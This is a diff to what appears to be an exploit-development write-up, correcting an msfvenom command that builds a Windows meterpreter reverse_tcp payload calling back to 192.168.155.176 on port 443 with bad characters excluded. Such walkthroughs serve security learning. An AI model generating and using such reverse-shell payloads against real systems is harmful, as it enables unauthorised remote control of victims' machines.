@@ -44,7 +44,7 @@ Next, we should move along and perform a bad chars evaluation. When we send the 
 
 The payload can then be crafted using the Metasploit Venom and passing the bad chars (```\x00 \x01 \x02 \x0a \x0d \x40```) with the '-b' flag. We generate a small payload to get remote code execution:
 
-```msfvenom -a x86 --platform Windows -p windows/meterpreter/revrse_tcp LHOST=192.168.155.176 LPORT=443 -b '\x00\x01\x02\x0a\x0d\x40 -f python --smallest```
+```msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.155.176 LPORT=443 -b '\x00\x01\x02\x0a\x0d\x40' -f python --smallest```
 
 In this case, I used a meterpreter payload just because but you can choose whatever you want. I just opened a listener on Metasploit console and ran the following exploit.
 
